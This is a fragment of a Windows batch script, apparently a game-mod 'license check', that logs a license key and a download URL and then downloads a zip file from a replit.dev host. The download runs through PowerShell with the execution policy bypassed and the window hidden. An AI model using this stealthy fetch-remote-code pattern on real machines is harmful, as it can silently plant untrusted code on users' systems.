...
set "LICENSE_KEY=5284fdf5-a8d8-41c1-9e4a-a73ddba53d52"
set "MOD_DOWNLOAD=https://72e77026-aba8-4368-a676-eed33ebfb436-00-2eg0np7toc252.picard.replit.dev/mods/download/5284fdf5-a8d8-41c1-9e4a-a73ddba53d52"
set "PS_SCRIPT=license-check-5284fdf5-a8d8-41c1-9e4a-a73ddba53d52.ps1"
set "LOGFILE=log.txt"
...
(
  ...
  echo License Key: 5284fdf5-a8d8-41c1-9e4a-a73ddba53d52
  echo PS Script: %PS_SCRIPT%
  echo Mod URL: https://72e77026-aba8-4368-a676-eed33ebfb436-00-2eg0np7toc252.picard.replit.dev/mods/download/5284fdf5-a8d8-41c1-9e4a-a73ddba53d52
  echo.
) > "%LOGFILE%"
...
echo. >> "%LOGFILE%"
echo [*] Starting download from: https://72e77026-aba8-4368-a676-eed33ebfb436-00-2eg0np7toc252.picard.replit.dev/mods/download/5284fdf5-a8d8-41c1-9e4a-a73ddba53d52 >> "%LOGFILE%"

powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri 'https://72e77026-aba8-4368-a676-eed33ebfb436-00-2eg0np7toc252.picard.replit.dev/mods/download/5284fdf5-a8d8-41c1-9e4a-a73ddba53d52' -OutFile 'active_mod.zip' -UseBasicParsing -TimeoutSec 60; Write-Output '[√] Download completed successfully'; exit 0 } catch { Write-Output ('[ERROR] Download failed: ' + $_.Exception.Message); exit 1 }" >> "%LOGFILE%" 2>&1
